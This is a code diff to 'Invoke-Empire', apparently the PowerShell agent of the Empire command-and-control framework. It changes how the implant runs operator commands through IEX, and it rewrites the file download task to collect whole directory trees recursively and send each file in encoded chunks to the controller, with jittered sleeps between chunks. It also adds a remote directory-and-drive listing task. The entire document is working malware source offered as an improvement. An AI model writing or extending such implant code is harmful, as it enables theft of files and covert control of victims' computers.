@@ -279,20 +279,20 @@ function Invoke-Empire {
         }
         else {
             switch -regex ($cmd) {
-                '(ls|dir)' {
+                '(ls|^dir)' {
                     if ($cmdargs.length -eq "") {
-                        $output = Get-ChildItem -force | select mode,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }},lastwritetime,length,name
+                        $output = Get-ChildItem -force | select mode,@{Name="Owner";Expression={(Get-Acl $_.FullName).Owner }},lastwritetime,length,name
                     }
                     else {
                         try{
-                            $output = IEX "$cmd $cmdargs -Force -ErrorAction Stop | select mode,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }},lastwritetime,length,name"
+                            $output = IEX "$cmd $cmdargs -Force -ErrorAction Stop" | select mode,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }},lastwritetime,length,name
                         }
                         catch [System.Management.Automation.ActionPreferenceStopException] {
                             $output = "[!] Error: $_ (or cannot be accessed)."
                         }
                     }
                 }
-                '(mv|move|copy|cp|rm|del|rmdir)' {
+                '(mv|move|copy|cp|rm|del|rmdir|mkdir)' {
                     if ($cmdargs.length -ne "") {
                         try {
                             IEX "$cmd $cmdargs -Force -ErrorAction Stop"
@@ -467,7 +467,6 @@ function Invoke-Empire {
         #   uris(comma separated)|UserAgent|header1=val|header2=val2...
         #   headers are optional. format is "key:value"
         #   ex- cookies are "cookie:blah=123;meh=456"
-
         $ProfileParts = $Profile.split('|')
         $script:TaskURIs = $ProfileParts[0].split(',')
         $script:UserAgent = $ProfileParts[1]
@@ -840,37 +839,40 @@ function Invoke-Empire {
                         $ChunkSize = 1024KB
                     }
 
-                    # resolve the complete path
-                    $Path = Get-Childitem $Path | ForEach-Object {$_.FullName}
+                    # resolve the complete paths
+                    $Path = Get-Childitem -Recurse $Path -File  | ForEach-Object {$_.FullName}
 
-                    # read in and send the specified chunk size back for as long as the file has more parts
-                    $Index = 0
-                    do{
-                        $EncodedPart = Get-FilePart -File "$path" -Index $Index -ChunkSize $ChunkSize
+                    foreach ( $File in $Path) {
+                        # read in and send the specified chunk size back for as long as the file has more parts
+                        $Index = 0
+                        do{
+                            $EncodedPart = Get-FilePart -File "$file" -Index $Index -ChunkSize $ChunkSize
+                            $filesize = (Get-Item $file).length
 
-                        if($EncodedPart) {
-                            $data = "{0}|{1}|{2}" -f $Index, $path, $EncodedPart
-                            (& $SendMessage -Packets $(Encode-Packet -type $type -data $($data) -ResultID $ResultID))
-                            $Index += 1
+                            if($EncodedPart) {
+                                $data = "{0}|{1}|{2}|{3}" -f $Index, $file, $filesize, $EncodedPart
+                                (& $SendMessage -Packets $(Encode-Packet -type $type -data $($data) -ResultID $ResultID))
+                                $Index += 1
 
-                            # if there are more parts of the file, sleep for the specified interval
-                            if ($script:AgentDelay -ne 0) {
-                                $min = [int]((1-$script:AgentJitter)*$script:AgentDelay)
-                                $max = [int]((1+$script:AgentJitter)*$script:AgentDelay)
+                                # if there are more parts of the file, sleep for the specified interval
+                                if ($script:AgentDelay -ne 0) {
+                                    $min = [int]((1-$script:AgentJitter)*$script:AgentDelay)
+                                    $max = [int]((1+$script:AgentJitter)*$script:AgentDelay)
 
-                                if ($min -eq $max) {
-                                    $sleepTime = $min
+                                    if ($min -eq $max) {
+                                        $sleepTime = $min
+                                    }
+                                    else{
+                                        $sleepTime = Get-Random -minimum $min -maximum $max;
+                                    }
+                                    Start-Sleep -s $sleepTime;
                                 }
-                                else{
-                                    $sleepTime = Get-Random -minimum $min -maximum $max;
-                                }
-                                Start-Sleep -s $sleepTime;
                             }
-                        }
-                        [GC]::Collect()
-                    } while($EncodedPart)
+                            [GC]::Collect()
+                        } while($EncodedPart)
 
-                    Encode-Packet -type 40 -data "[*] File download of $path completed" -ResultID $ResultID
+                        Encode-Packet -type 40 -data "[*] File download of $file completed" -ResultID $ResultID
+                    }
                 }
                 catch {
                     Encode-Packet -type 0 -data '[!] File does not exist or cannot be accessed' -ResultID $ResultID
@@ -890,6 +892,36 @@ function Invoke-Empire {
                 catch {
                     Encode-Packet -type 0 -data '[!] Error in writing file during upload' -ResultID $ResultID
                 }
+            }
+            # directory list
+            elseif($type -eq 43) {
+                $output = ""
+                $path = "/"
+                if ($data.length -gt 1) { # Use user supplied directory
+                    $path = $data
+                }
+                if ($path -eq "/") { # if the path is root, list drives as directories
+                    $array = @()
+                    $drives = Get-PSDrive -PSProvider FileSystem |where {($_.Used -gt 0)} | ForEach-Object {
+                        $array += (@{path =  $_.Root; name = $_.Root; is_file = $false})
+                    }
+                    $output = @{directory_name = "/"; directory_path = "/"; items = $array} | ConvertTo-Json -Compress
+                } elseif (-Not (Test-Path $path -PathType Container)) { # if path doesn't exist
+                    $output = "Directory " + $path + " not found."
+                } else {
+                # Normal conditions
+                    $array = @()
+                    Get-ChildItem -force -Path $path -Attributes !directory | foreach-object { $array += (@{ path = $_.FullName; name = $_.Name; is_file = $true }) }
+                    Get-ChildItem -force -Path $path -Attributes directory | foreach-object { $array += (@{ path = $_.FullName; name = $_.Name; is_file = $false }) }
+                    $directory = Get-Item -force -Path $path # this way we always get the backslashes even if user supplied forward slashes
+                    $output = @{ directory_name = $directory.Name; directory_path = $directory.FullName; items = $array } | ConvertTo-Json -Compress
+
+                    if ($directory -eq $null)
+                    {
+                        $output = "User does not have access to directory " + $path
+                    }
+                }
+                Encode-Packet -data $output -type $type -ResultID $ResultID
             }
 
             # return the currently running jobs
